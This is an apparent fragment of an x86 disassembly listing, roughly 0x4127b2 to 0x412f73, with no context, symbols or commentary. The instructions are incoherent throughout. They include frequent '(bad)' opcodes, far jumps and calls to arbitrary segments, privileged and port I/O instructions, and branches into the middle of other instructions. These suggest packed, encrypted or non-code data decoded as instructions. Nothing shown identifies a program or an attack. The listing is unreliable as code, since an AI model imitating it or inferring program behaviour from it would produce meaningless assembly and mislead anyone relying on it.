  4127b2:	daa    
  4127b3:	adc    ebx,DWORD PTR [edi+0x6c]
  4127b6:	xchg   ebx,eax
  4127b7:	test   eax,0x743b1351
  4127bc:	add    BYTE PTR [esi+eiz*4],0xae
  4127c0:	inc    eax
  4127c1:	mov    ebx,0x5b5877c9
  4127c6:	(bad)  
  4127c7:	fidiv  DWORD PTR [esi-0x7bc39ce6]
  4127cd:	fcom   QWORD PTR [ebx-0x413c5043]
  4127d3:	bound  ebx,QWORD PTR [ecx-0x56]
  4127d6:	pop    ecx
  4127d7:	inc    esi
  4127d8:	fcmovbe st,st(1)
  4127da:	push   esi
  4127db:	call   0xb66ea77f
  4127e0:	jno    0x412769
  4127e2:	(bad)  
  4127e3:	mov    ebx,0x329cc507
  4127e8:	pop    eax
  4127e9:	addr16 aaa 
  4127eb:	cli    
  4127ec:	jmp    0xf8c7:0x54ddee66
  4127f3:	cmp    ebx,esi
  4127f5:	cmp    cl,BYTE PTR fs:[ebp+0xb1d698c]
  4127fc:	lock outs dx,DWORD PTR ds:[esi]
  4127fe:	and    dh,bl
  412800:	push   ss
  412801:	xchg   esi,eax
  412802:	call   0x5a1478b8
  412807:	or     BYTE PTR [eax-0x2f],dh
  41280a:	ds popa 
  41280c:	and    esp,DWORD PTR [edx]
  41280e:	adc    BYTE PTR [ebx-0x4360374f],0x7
  412815:	cmp    dh,BYTE PTR [edi]
  412817:	add    eax,0xa24942ef
  41281c:	push   cs
  41281d:	push   ds
  41281e:	pop    ss
  41281f:	(bad)  
  412821:	or     DWORD PTR [ebp+edi*4+0xedd4c54],0xc
  412829:	inc    ebp
  41282a:	in     al,dx
  41282b:	push   cs
  41282c:	sahf   
  41282d:	inc    ebp
  41282e:	sbb    al,0x2f
  412830:	xor    ch,BYTE PTR [ecx]
  412832:	push   ss
  412833:	and    eax,0x9fa4c96c
  412838:	push   esp
  412839:	jne    0x41285d
  41283b:	ins    BYTE PTR es:[edi],dx
  41283c:	test   al,0x2d
  41283e:	jnp    0x41281c
  412840:	jnp    0x4127e4
  412842:	pop    ds
  412843:	in     eax,0x39
  412845:	dec    ebx
  412846:	nop
  412847:	sbb    DWORD PTR [esi+0x141d98c8],ebp
  41284d:	mov    ds:0x1c9e53b9,eax
  412852:	ds aam 0x97
  412855:	sub    edx,DWORD PTR [esi-0x19c8343a]
  41285b:	stc    
  41285c:	add    eax,0xcd61f7c6
  412861:	xor    al,0x61
  412863:	dec    ebx
  412864:	mov    esp,0x5e4cb1a9
  412869:	dec    esi
  41286a:	clc    
  41286b:	int    0x5
  41286d:	inc    eax
  41286e:	push   ecx
  41286f:	das    
  412870:	and    DWORD PTR [edx-0x5a419aba],ebx
  412876:	and    eax,0xd7235351
  41287b:	add    eax,0x333f7dde
  412880:	fild   DWORD PTR [ebx]
  412882:	ret    
  412883:	mov    edx,0x8fe041c8
  412888:	xchg   ebx,eax
  412889:	push   ds
  41288a:	cmp    BYTE PTR [ebx],bh
  41288c:	jns    0x4128c2
  41288e:	(bad)  
  41288f:	imul   edx,DWORD PTR [eax+0x3e7e317c],0xae7348e7
  412899:	sub    edx,ebp
  41289b:	in     eax,0xfc
  41289d:	fs cmp edi,ecx
  4128a0:	in     eax,0x8a
  4128a2:	test   eax,0xdfea997
  4128a7:	hlt    
  4128a8:	shr    BYTE PTR [esi+0x6635fe05],0x5
  4128af:	pop    es
  4128b0:	jmp    0xe96362c
  4128b5:	xchg   DWORD PTR [esi],edi
  4128b7:	or     DWORD PTR [esi-0x1e754bfa],esp
  4128bd:	xor    BYTE PTR [ebp-0x5b2c0ac2],0x45
  4128c4:	int    0x44
  4128c6:	neg    BYTE PTR [ebp-0x67cfec81]
  4128cc:	push   edx
  4128cd:	iret   
  4128ce:	retf   
  4128cf:	hlt    
  4128d0:	popa   
  4128d1:	or     eax,0xeb57f32d
  4128d6:	mov    edi,0xd302ab4f
  4128db:	aad    0x26
  4128dd:	test   bl,dl
  4128df:	out    dx,al
  4128e0:	rcl    bl,cl
  4128e2:	ss xor cl,bl
  4128e5:	sahf   
  4128e6:	xor    eax,DWORD PTR [ebx+0x5c]
  4128e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ea:	fidiv  WORD PTR [eax+ecx*8+0x19e379b]
  4128f1:	jmp    0x7ee3:0xb820a9d9
  4128f8:	dec    edx
  4128f9:	push   cs
  4128fa:	ins    DWORD PTR es:[edi],dx
  4128fb:	dec    eax
  4128fc:	lea    eax,[ebp-0x111d06eb]
  412902:	or     DWORD PTR [edx-0xee5dd01],ebp
  412908:	xchg   ebp,eax
  412909:	or     al,0x8b
  41290b:	(bad)  
  41290c:	push   ebp
  41290d:	mov    ebx,0xc214ef4b
  412912:	mov    bl,0x28
  412914:	call   0xc3ac9a3a
  412919:	pusha  
  41291a:	push   esi
  41291b:	stos   BYTE PTR es:[edi],al
  41291c:	mov    ecx,0xd520a37a
  412921:	sub    DWORD PTR [ebx],ecx
  412923:	call   0xd511d1ff
  412928:	adc    al,0x59
  41292a:	inc    eax
  41292b:	call   0xcb4a:0x2e43ac17
  412932:	scas   al,BYTE PTR es:[edi]
  412933:	fstp   QWORD PTR gs:[ebx+ebx*8]
  412937:	mov    edx,0xbbd0d1c0
  41293c:	mov    WORD PTR [ebx],ds
  41293e:	add    BYTE PTR [ecx-0x28],al
  412941:	aam    0xe6
  412943:	fimul  DWORD PTR [edi+0x3bbf4ee5]
  412949:	outs   dx,BYTE PTR ds:[esi]
  41294a:	inc    ebp
  41294b:	add    al,0x50
  41294d:	jne    0x41293e
  41294f:	xchg   edx,eax
  412950:	dec    esi
  412951:	push   ebp
  412952:	pop    esi
  412953:	jno    0x4129cb
  412955:	mov    esp,0xdb38ec33
  41295a:	ja     0x412986
  41295c:	cwde   
  41295d:	adc    dl,BYTE PTR [edx+0x62]
  412960:	jmp    0x776f4cc7
  412965:	imul   edx,DWORD PTR [ecx+0x54],0xffffffa5
  412969:	aad    0xb1
  41296b:	aas    
  41296c:	add    BYTE PTR [ebp+0x50],bl
  41296f:	dec    ebp
  412970:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412971:	cmp    edi,esp
  412973:	inc    edi
  412974:	lds    esi,FWORD PTR [esi]
  412976:	pusha  
  412977:	jmp    0x7da1b72c
  41297c:	push   edi
  41297d:	jno    0x4129bc
  41297f:	jmp    0xdc8a:0x2a806ac
  412986:	cmp    eax,0x6c9b922e
  41298b:	adc    bl,BYTE PTR [ebx+0x27]
  41298e:	cmp    eax,esi
  412990:	mov    bl,0xfc
  412992:	lock xchg DWORD PTR [edx+0x4557bfa5],edi
  412999:	or     al,0x23
  41299b:	aam    0xc8
  41299d:	fst    QWORD PTR [eax+0x11]
  4129a0:	das    
  4129a1:	and    al,0x7c
  4129a3:	or     al,0x10
  4129a5:	mov    ebx,fs
  4129a7:	sbb    al,0x54
  4129a9:	and    ecx,DWORD PTR [ebx-0x31]
  4129ac:	jne    0x412961
  4129ae:	mov    ecx,0x8d1cd879
  4129b3:	mov    cl,BYTE PTR [esi+esi*2]
  4129b6:	or     al,0x61
  4129b8:	mov    ah,0x67
  4129ba:	adc    al,al
  4129bc:	or     eax,0x2621cc31
  4129c1:	adc    DWORD PTR [ebx],ebp
  4129c3:	sub    eax,0x1768122c
  4129c8:	xor    DWORD PTR [ecx+0x5e],ecx
  4129cb:	jnp    0x4129b7
  4129cd:	push   edx
  4129ce:	leave  
  4129cf:	and    DWORD PTR [eax],ecx
  4129d1:	or     ebx,DWORD PTR [esi+0x4aab0423]
  4129d7:	mov    al,ds:0x73475fe2
  4129dc:	retf   
  4129dd:	test   esi,ebx
  4129df:	popa   
  4129e0:	mov    al,ds:0xa40f6ae3
  4129e5:	xlat   BYTE PTR ds:[ebx]
  4129e6:	aas    
  4129e7:	mov    ah,0xf2
  4129e9:	loop   0x412a23
  4129eb:	enter  0xe854,0x7a
  4129ef:	mov    eax,0xd636f15
  4129f4:	loopne 0x4129a8
  4129f6:	cdq    
  4129f7:	pusha  
  4129f8:	mov    esi,0x8ae98488
  4129fd:	push   0xf8671492
  412a02:	(bad)  
  412a03:	fild   DWORD PTR [ebx]
  412a05:	cs jb  0x412a62
  412a08:	pushf  
  412a09:	sahf   
  412a0a:	popa   
  412a0b:	(bad)  
  412a0c:	(bad)  
  412a0d:	int3   
  412a0e:	adc    BYTE PTR [ebp+0x31],dl
  412a11:	mov    ah,0x6
  412a13:	xchg   edi,eax
  412a14:	pushf  
  412a15:	pop    eax
  412a16:	aad    0xdf
  412a18:	hlt    
  412a19:	push   es
  412a1a:	or     edx,DWORD PTR [bx+0x7b]
  412a1e:	(bad)  
  412a1f:	jmp    0x412a91
  412a21:	cmp    al,BYTE PTR [ebp-0x6a6e2e3d]
  412a27:	add    BYTE PTR [ebx+0x79],0x39
  412a2b:	jg     0x412a14
  412a2d:	pop    eax
  412a2e:	sbb    ebx,eax
  412a30:	(bad)  
  412a31:	rcl    BYTE PTR [eax+0x523843b7],0xcd
  412a38:	push   ss
  412a39:	jno    0x412a24
  412a3b:	add    al,0x77
  412a3d:	push   edx
  412a3e:	sub    al,dl
  412a40:	sub    al,0x2f
  412a42:	mov    ?,WORD PTR [esi+0x74]
  412a45:	mov    DWORD PTR [eax-0x75],ecx
  412a48:	jns    0x412a75
  412a4a:	pop    ebp
  412a4b:	adc    al,0xa7
  412a4d:	jmp    0x1ec3:0x4c08d2e5
  412a54:	(bad)  
  412a56:	stos   BYTE PTR es:[edi],al
  412a57:	pop    eax
  412a58:	jbe    0x412a15
  412a5a:	xchg   esp,eax
  412a5b:	pop    edi
  412a5c:	lock or al,0x31
  412a5f:	(bad)  [edi]
  412a61:	xor    BYTE PTR [esi-0x78],dh
  412a64:	test   DWORD PTR [edx-0x13],ecx
  412a67:	sbb    BYTE PTR [edi],al
  412a69:	push   es
  412a6a:	sub    DWORD PTR [ecx+0x4b0ed222],esp
  412a70:	dec    ebx
  412a71:	and    ecx,ebp
  412a73:	inc    edx
  412a74:	aas    
  412a75:	mov    ds,WORD PTR [edi-0x21d25c37]
  412a7b:	xchg   esp,eax
  412a7c:	add    al,0xdb
  412a7e:	outs   dx,DWORD PTR ds:[esi]
  412a7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a80:	jecxz  0x412aca
  412a82:	jo     0x412a0d
  412a84:	icebp  
  412a85:	inc    ebx
  412a86:	cmp    edx,DWORD PTR [edi-0x28]
  412a89:	cwde   
  412a8a:	pop    edi
  412a8b:	or     dh,BYTE PTR [eax-0x15af2e42]
  412a91:	dec    ecx
  412a92:	mov    esi,0x192789c6
  412a97:	loop   0x412a1c
  412a99:	jmp    0x1a120e78
  412a9e:	cmp    dh,BYTE PTR [ebx-0x64]
  412aa1:	mov    ds:0xe98ba0bc,eax
  412aa6:	mov    esi,0xf7775035
  412aab:	mov    cs,ecx
  412aad:	hlt    
  412aae:	cmp    eax,0x7c1f50c8
  412ab3:	stc    
  412ab4:	cmc    
  412ab5:	or     eax,DWORD PTR [edx-0x45b037b3]
  412abb:	rol    BYTE PTR [ebx-0x27],0xb6
  412abf:	inc    esp
  412ac0:	pop    ecx
  412ac1:	dec    esi
  412ac2:	xchg   DWORD PTR ds:0x26260aba,esi
  412ac8:	mov    dh,0x64
  412aca:	loop   0x412b30
  412acc:	or     DWORD PTR [eax+0x3a54207c],ebp
  412ad2:	dec    esp
  412ad3:	push   edi
  412ad4:	push   cs
  412ad5:	inc    BYTE PTR [ebp-0x5bff307f]
  412adb:	fucom  st(1)
  412add:	dec    DWORD PTR [esi+edx*4+0x17d5ac73]
  412ae4:	jno    0x412b24
  412ae6:	add    bl,dl
  412ae8:	sub    BYTE PTR [ecx],0x57
  412aeb:	daa    
  412aec:	sub    edi,ebp
  412aee:	jl     0x412a95
  412af0:	stc    
  412af1:	mov    gs,ebp
  412af3:	arpl   WORD PTR [ebp+0x4e],sp
  412af6:	aaa    
  412af7:	sbb    ah,BYTE PTR [edi-0x6ea04d54]
  412afd:	(bad)  
  412afe:	push   eax
  412aff:	jmp    0xf6fd:0x38e769e3
  412b06:	aaa    
  412b07:	loope  0x412b00
  412b09:	mov    ?,edi
  412b0b:	add    esi,DWORD PTR [ecx-0x20c9d936]
  412b11:	cmp    esi,DWORD PTR [edi-0x31]
  412b14:	call   0xb969846b
  412b19:	pop    ss
  412b1a:	ficom  DWORD PTR [eax+0x60]
  412b1d:	add    eax,0x6f598c39
  412b22:	iret   
  412b23:	ds mov cl,0x6
  412b26:	call   0x922f:0x8d29850f
  412b2d:	xchg   ebp,eax
  412b2e:	jg     0x412b7c
  412b30:	sti    
  412b31:	mov    ah,0xc0
  412b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b34:	jb     0x412b1b
  412b36:	and    BYTE PTR [edi],0x58
  412b39:	shl    BYTE PTR [edi+0x28],cl
  412b3c:	iret   
  412b3d:	inc    esp
  412b3e:	ror    edi,1
  412b40:	dec    edx
  412b41:	adc    edi,DWORD PTR [ebx]
  412b43:	(bad)  
  412b44:	shr    BYTE PTR [ecx-0x49],1
  412b47:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  412b49:	sbb    esp,edx
  412b4b:	mov    eax,ds:0xfc61660f
  412b50:	fadd   DWORD PTR ds:0x905ae50
  412b56:	xlat   BYTE PTR ds:[ebx]
  412b57:	sub    BYTE PTR [edx],ch
  412b59:	xchg   ch,dh
  412b5b:	mov    dl,0x68
  412b5d:	inc    edi
  412b5e:	jmp    0x412b94
  412b60:	dec    esi
  412b61:	xor    ecx,DWORD PTR [ecx]
  412b63:	adc    eax,0xfdd2ea77
  412b68:	sbb    eax,0xd5220d4d
  412b6d:	gs inc esi
  412b6f:	dec    ecx
  412b70:	rol    bh,1
  412b72:	mov    al,ds:0x585efe79
  412b77:	imul   DWORD PTR [edi]
  412b79:	fisubr WORD PTR [ebx+0x8]
  412b7c:	stc    
  412b7d:	inc    DWORD PTR [edi]
  412b7f:	xor    al,0xc8
  412b81:	loop   0x412b68
  412b83:	(bad)  
  412b84:	sub    eax,0xbbbdf6dc
  412b89:	and    al,0x98
  412b8b:	out    dx,al
  412b8c:	mov    ebx,0x9d71ead8
  412b91:	mov    ecx,0xb3734a91
  412b96:	call   0xc10:0x2f35a014
  412b9d:	in     eax,0xb
  412b9f:	retf   
  412ba0:	xchg   dh,bh
  412ba2:	bound  eax,QWORD PTR [ecx-0x51942436]
  412ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412baa:	cmp    BYTE PTR [ebp+ecx*2-0x449ed668],0xe1
  412bb2:	pop    edx
  412bb3:	jb     0x412b3d
  412bb5:	cmpxchg DWORD PTR [edi],ecx
  412bb8:	bound  ecx,QWORD PTR [ebp+0x3e]
  412bbb:	into   
  412bbc:	sub    eax,0x84497ac0
  412bc1:	jbe    0x412ba0
  412bc3:	add    eax,0x51a5fc6
  412bc8:	mov    al,ds:0xcbd36314
  412bcd:	das    
  412bce:	push   0x2e6513b9
  412bd3:	or     DWORD PTR [edx+0x3649f509],ebx
  412bd9:	pop    esi
  412bda:	test   eax,0x168b453f
  412bdf:	xchg   BYTE PTR [esi+eax*1+0x66],ah
  412be3:	xchg   ebp,eax
  412be4:	imul   esi,DWORD PTR [ebx+0x40],0x65726d5b
  412beb:	xchg   ebp,ecx
  412bed:	cmp    ecx,eax
  412bef:	jae    0x412c52
  412bf1:	call   0xed398916
  412bf6:	mov    ch,BYTE PTR [edi-0x60]
  412bf9:	xor    ch,BYTE PTR [ebp+0x38ba84e1]
  412bff:	cld    
  412c00:	xor    BYTE PTR [ebp+0x20],ch
  412c03:	mov    eax,ds:0x4ae0a8ed
  412c08:	retf   0xcdc
  412c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c0c:	stc    
  412c0d:	adc    eax,0x9d3a3ee5
  412c12:	stc    
  412c13:	mov    bl,0xd8
  412c15:	xlat   BYTE PTR ds:[ebx]
  412c16:	lahf   
  412c17:	dec    ebp
  412c18:	push   ebx
  412c19:	cmp    DWORD PTR [edi],esp
  412c1b:	jb     0x412bb4
  412c1d:	sti    
  412c1e:	lock test BYTE PTR [ebp-0x66e73910],0x6c
  412c26:	and    eax,DWORD PTR [eax-0x6f]
  412c29:	cwde   
  412c2a:	(bad)  
  412c2b:	(bad)  
  412c2c:	loopne 0x412c16
  412c2e:	push   0xffffffc8
  412c30:	aas    
  412c31:	push   es
  412c32:	and    BYTE PTR [ecx],bh
  412c34:	aam    0x83
  412c36:	xor    al,0x5f
  412c38:	xor    BYTE PTR ds:0xb79913e7,dh
  412c3e:	mov    ch,0xde
  412c40:	inc    esp
  412c41:	repz mov al,ds:0x5f6911b7
  412c47:	inc    ebp
  412c48:	mov    bl,0x49
  412c4a:	mov    esp,0xd7428ef9
  412c4f:	add    dl,0x6b
  412c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c53:	push   ebx
  412c54:	sahf   
  412c55:	jmp    0x412ca5
  412c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c58:	cli    
  412c59:	stos   DWORD PTR es:[edi],eax
  412c5a:	mov    bl,0x37
  412c5c:	in     eax,dx
  412c5d:	cmp    edi,DWORD PTR [ebx+0x57c117c0]
  412c63:	cmp    ch,BYTE PTR [esi+0x2ef96047]
  412c69:	(bad)  
  412c6a:	sbb    DWORD PTR [edx+0x4d50756],esp
  412c70:	je     0x412c15
  412c72:	ins    BYTE PTR es:[edi],dx
  412c73:	push   es
  412c74:	popf   
  412c75:	pop    ecx
  412c76:	into   
  412c77:	push   ebp
  412c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c79:	fcom   DWORD PTR [ebx-0x23f10047]
  412c7f:	test   eax,0x263b7c60
  412c84:	ins    DWORD PTR es:[edi],dx
  412c85:	aas    
  412c86:	aam    0xbc
  412c88:	add    eax,0x9a0e974
  412c8d:	xchg   esi,eax
  412c8e:	call   ebp
  412c90:	aas    
  412c91:	scas   al,BYTE PTR es:[edi]
  412c92:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c94:	push   ebp
  412c95:	jle    0x412c91
  412c97:	(bad)  
  412c98:	push   edi
  412c99:	sub    ecx,ebx
  412c9b:	mov    ecx,0x50964bd0
  412ca0:	jp     0x412c8b
  412ca2:	imul   esp,DWORD PTR [edi-0x3b9331ea],0xed0ae8d1
  412cac:	leave  
  412cad:	mov    edi,0x643dcbf6
  412cb2:	inc    ecx
  412cb3:	je     0x412c60
  412cb5:	and    eax,DWORD PTR [edx]
  412cb7:	mov    cl,0xa5
  412cb9:	and    al,0x5b
  412cbb:	je     0x412c94
  412cbd:	jmp    0x412cc6
  412cbf:	or     DWORD PTR [ecx],edi
  412cc1:	jg     0x412d0b
  412cc3:	sbb    BYTE PTR [eax],0x56
  412cc6:	xor    ah,ah
  412cc8:	sub    dl,BYTE PTR [edx-0x3b]
  412ccb:	sbb    cl,BYTE PTR ss:[ebp+esi*8-0x3387ae11]
  412cd3:	or     ah,BYTE PTR [edi+ebp*4+0x69]
  412cd7:	mov    ch,0xbe
  412cd9:	add    ebx,0x49
  412cdc:	xor    eax,0x7fa86f85
  412ce1:	jmp    0xe53c:0x2f741b
  412ce8:	jae    0x412cd9
  412cea:	fistp  QWORD PTR [edx+0x46]
  412ced:	mov    ecx,DWORD PTR [eax-0x13]
  412cf0:	stc    
  412cf1:	push   0xffffff9f
  412cf3:	cmp    cl,0x14
  412cf6:	xchg   edx,eax
  412cf7:	fstp   QWORD PTR [edx+ebp*1]
  412cfa:	sbb    bh,0x24
  412cfd:	sti    
  412cfe:	xor    DWORD PTR [ebx+0x3a],ecx
  412d01:	cmp    esp,DWORD PTR [edi-0x31]
  412d04:	fimul  WORD PTR [ebx]
  412d06:	pushf  
  412d07:	call   0xa0ec:0xc3384af3
  412d0e:	inc    ebp
  412d0f:	and    ebx,DWORD PTR [ebx+ebp*8]
  412d12:	stos   DWORD PTR es:[edi],eax
  412d13:	sbb    DWORD PTR [edx],edi
  412d15:	and    eax,DWORD PTR [edx+0x77004a1e]
  412d1b:	out    dx,al
  412d1c:	outs   dx,DWORD PTR ds:[esi]
  412d1d:	jl     0x412d6e
  412d1f:	dec    esp
  412d20:	ins    BYTE PTR es:[edi],dx
  412d21:	scas   eax,DWORD PTR es:[edi]
  412d22:	(bad)  
  412d23:	nop
  412d24:	ins    DWORD PTR es:[edi],dx
  412d25:	idiv   BYTE PTR ds:0xe8fb8dc1
  412d2b:	inc    ebx
  412d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d2d:	mov    eax,DWORD PTR [eax]
  412d2f:	iret   
  412d30:	fiadd  WORD PTR [edi-0x19013c8c]
  412d36:	inc    esi
  412d37:	push   esp
  412d38:	sub    BYTE PTR ds:0xcac02bc7,ch
  412d3e:	push   edi
  412d3f:	cmp    al,0x80
  412d41:	pushf  
  412d42:	adc    eax,0x52e6ea73
  412d47:	sbb    BYTE PTR [ebx-0x64],dl
  412d4a:	pushf  
  412d4b:	icebp  
  412d4c:	mov    ebp,0xb4cb38a0
  412d51:	ja     0x412db4
  412d53:	retf   0x17ad
  412d56:	mov    edx,0x2390ce76
  412d5b:	sbb    al,0xaa
  412d5d:	sbb    dl,BYTE PTR [ebx-0x69]
  412d60:	sbb    eax,0xb1fa1df1
  412d65:	adc    cl,ch
  412d67:	in     eax,dx
  412d68:	and    al,0xb7
  412d6a:	inc    ecx
  412d6b:	add    esi,DWORD PTR [ebx+0x6d9261f8]
  412d71:	into   
  412d72:	jns    0x412dd4
  412d74:	ins    BYTE PTR es:[edi],dx
  412d75:	fidivr DWORD PTR [edx+0x3d]
  412d78:	fstp   TBYTE PTR [edx+eiz*2+0x5]
  412d7c:	clc    
  412d7d:	shl    BYTE PTR [ecx+ebp*2],0x4f
  412d81:	adc    al,BYTE PTR [edi+0x798ef205]
  412d87:	cmp    bl,BYTE PTR [ebx-0xb]
  412d8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d8b:	jecxz  0x412d55
  412d8d:	mov    edx,fs
  412d8f:	sbb    ch,bh
  412d91:	jbe    0x412d60
  412d93:	in     al,dx
  412d94:	sbb    al,0xa7
  412d96:	lea    eax,[ebx+0x2414119c]
  412d9c:	cmp    DWORD PTR [edx+edx*8-0x7a81a2ea],0x35
  412da4:	pop    edx
  412da5:	pop    ds
  412da6:	dec    esi
  412da7:	inc    esp
  412da8:	jbe    0x412d7b
  412daa:	mov    ah,0xe5
  412dac:	dec    ecx
  412dad:	pop    edi
  412dae:	inc    eax
  412daf:	cdq    
  412db0:	int3   
  412db1:	pusha  
  412db2:	mov    BYTE PTR [edi],al
  412db4:	popa   
  412db5:	and    edx,DWORD PTR [eax]
  412db7:	cmp    bl,cl
  412db9:	mov    dh,0x4a
  412dbb:	push   eax
  412dbc:	inc    edx
  412dbd:	or     bh,ch
  412dbf:	stos   BYTE PTR es:[edi],al
  412dc0:	jmp    0x412e19
  412dc2:	dec    ebp
  412dc3:	dec    edi
  412dc4:	mov    eax,0xcbfbb6b6
  412dc9:	mov    cl,0x90
  412dcb:	int3   
  412dcc:	icebp  
  412dcd:	jmp    0x831042c8
  412dd2:	test   ecx,0xf3d42b8e
  412dd8:	adc    BYTE PTR [edi+0x70],al
  412ddb:	pop    ebp
  412ddc:	int3   
  412ddd:	and    dl,cl
  412ddf:	pop    eax
  412de0:	stc    
  412de1:	mov    al,ds:0xacda652e
  412de6:	outs   dx,BYTE PTR ds:[esi]
  412de7:	or     bh,dh
  412de9:	pop    ds
  412dea:	pop    es
  412deb:	in     al,0x9d
  412ded:	inc    ebx
  412dee:	popa   
  412def:	and    eax,0x4e545b
  412df4:	ins    BYTE PTR es:[edi],dx
  412df5:	push   esi
  412df6:	and    eax,edx
  412df8:	add    eax,0x46b02677
  412dfd:	fisub  DWORD PTR [eax]
  412dff:	mov    al,0x8f
  412e01:	sub    ch,BYTE PTR [edx]
  412e03:	out    dx,eax
  412e04:	jmp    0x412df3
  412e06:	push   0x44aed36a
  412e0b:	out    0x53,eax
  412e0d:	into   
  412e0e:	dec    ecx
  412e0f:	sub    ebp,DWORD PTR [ebx-0x64]
  412e12:	fstp   TBYTE PTR [eax+0x39]
  412e15:	jb     0x412dbf
  412e17:	nop
  412e18:	mov    ecx,0x9dbb312f
  412e1d:	aad    0x59
  412e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e20:	nop
  412e21:	retf   0x5f06
  412e24:	add    BYTE PTR ds:0x5329530a,dh
  412e2a:	add    ebp,DWORD PTR [edi-0x5b]
  412e2d:	retf   
  412e2e:	push   edx
  412e2f:	mov    ch,0xb4
  412e31:	jno    0x412e08
  412e33:	cmp    al,0x1
  412e35:	jno    0x412dcc
  412e37:	rol    esp,cl
  412e39:	mov    ds:0x22eed80b,al
  412e3e:	retf   
  412e3f:	test   al,0xe
  412e41:	rcl    BYTE PTR [ecx],cl
  412e43:	(bad)  
  412e44:	loope  0x412dc9
  412e46:	sub    eax,0x8b554f6
  412e4b:	sbb    esi,DWORD PTR [ebx-0xd9d03ea]
  412e51:	push   edi
  412e52:	aam    0x7c
  412e54:	cwde   
  412e55:	lods   eax,DWORD PTR ds:[esi]
  412e56:	and    eax,0x88d64f9b
  412e5b:	dec    edi
  412e5c:	sub    al,0xa1
  412e5e:	fcomp  QWORD PTR [ecx-0xa98fc26]
  412e64:	fcmovb st,st(0)
  412e66:	inc    ebp
  412e67:	iret   
  412e68:	mov    WORD PTR [ebx],?
  412e6a:	push   edx
  412e6b:	out    dx,al
  412e6c:	test   DWORD PTR [eax-0x1850ea89],0x64f79abf
  412e76:	adc    al,0xb6
  412e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e79:	pushf  
  412e7a:	pop    esp
  412e7b:	ficom  DWORD PTR [esp+edx*4]
  412e7e:	mov    esi,0x3a86ca01
  412e83:	lds    edi,FWORD PTR [esi+0x16]
  412e86:	sbb    ah,BYTE PTR [edx+0x25f2bfdf]
  412e8c:	fdiv   QWORD PTR [esi+0x34]
  412e8f:	loop   0x412edb
  412e91:	or     eax,0x9acf62c3
  412e96:	cdq    
  412e97:	add    DWORD PTR [edx+0x7d],edx
  412e9a:	mov    bl,0x82
  412e9c:	popf   
  412e9d:	lds    eax,FWORD PTR [ebx+0x7e]
  412ea0:	add    esp,DWORD PTR [ebp+0x6f6e98d0]
  412ea6:	mov    esi,0x6b71169f
  412eab:	pop    edx
  412eac:	mov    dl,0xfa
  412eae:	hlt    
  412eaf:	pop    edi
  412eb0:	les    edx,FWORD PTR [eax+0x215ddc6]
  412eb6:	aad    0x25
  412eb8:	dec    ebp
  412eb9:	and    ecx,esi
  412ebb:	test   DWORD PTR [ebx+0x54],0xa1f17d36
  412ec2:	dec    esp
  412ec3:	scas   eax,DWORD PTR es:[edi]
  412ec4:	xor    esi,ebx
  412ec6:	test   BYTE PTR [ecx+eax*1+0x30a85aec],ah
  412ecd:	jl     0x412e74
  412ecf:	je     0x412e79
  412ed1:	inc    ecx
  412ed2:	fistp  QWORD PTR [edi+0x39aa47d2]
  412ed8:	push   ds
  412ed9:	loopne 0x412f38
  412edb:	xchg   esi,eax
  412edc:	in     al,0x2a
  412ede:	jo     0x412ed5
  412ee0:	not    DWORD PTR [esi+0x2c3f65ba]
  412ee6:	cmp    esp,0x6
  412ee9:	mov    ds:0x8e9da1c1,eax
  412eee:	out    0xec,eax
  412ef0:	xchg   BYTE PTR [eax-0x41],ah
  412ef3:	pop    ebx
  412ef4:	jl     0x412ebe
  412ef6:	out    dx,al
  412ef7:	adc    eax,0x3524c3a6
  412efc:	and    BYTE PTR [esi-0x4f],0xa
  412f00:	ins    DWORD PTR es:[edi],dx
  412f01:	cmp    DWORD PTR [esi],ebx
  412f03:	adc    DWORD PTR [esi],edi
  412f05:	xchg   ebp,eax
  412f06:	xor    cl,BYTE PTR [eax+0x69]
  412f09:	fisttp WORD PTR [edi]
  412f0b:	xor    DWORD PTR [ebx+0x6f001f74],edx
  412f11:	addr16 or edi,edx
  412f14:	or     cl,BYTE PTR [ebp-0x4d779481]
  412f1a:	sbb    bh,BYTE PTR ds:0xa27b4d21
  412f20:	lods   al,BYTE PTR ds:[esi]
  412f21:	push   ss
  412f22:	sub    eax,0x78a0f5ab
  412f27:	in     eax,0x2f
  412f29:	jo     0x412f03
  412f2b:	and    al,0xe1
  412f2d:	test   bh,0x1b
  412f30:	repz pop esi
  412f32:	out    0x33,eax
  412f34:	and    al,0xc4
  412f36:	xchg   esp,eax
  412f37:	dec    edx
  412f38:	mov    ebx,0xbfbb0fe2
  412f3d:	std    
  412f3e:	add    al,0x5e
  412f40:	mov    bx,0xcb5
  412f44:	repnz or al,0xd
  412f47:	xchg   esp,eax
  412f48:	xchg   ebp,eax
  412f49:	sub    bl,dh
  412f4b:	fldcw  WORD PTR [ebx+0x3e]
  412f4e:	(bad)  
  412f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f50:	push   cs
  412f51:	bswap  ebx
  412f53:	loope  0x412f61
  412f55:	xor    BYTE PTR [edi+0x9],0x6d
  412f59:	jg     0x412f5a
  412f5b:	jp     0x412f3b
  412f5d:	push   edx
  412f5e:	pop    edi
  412f5f:	and    eax,DWORD PTR [eax+0x72]
  412f62:	pop    eax
  412f63:	mov    DWORD PTR [edi-0xee2badd],ebx
  412f69:	stos   BYTE PTR es:[edi],al
  412f6a:	repz push ebp
  412f6c:	sub    esp,DWORD PTR [edi-0x10318adf]
  412f72:	pop    edx
  412f73:	ficom  DWORD PTR [eax+0x26]
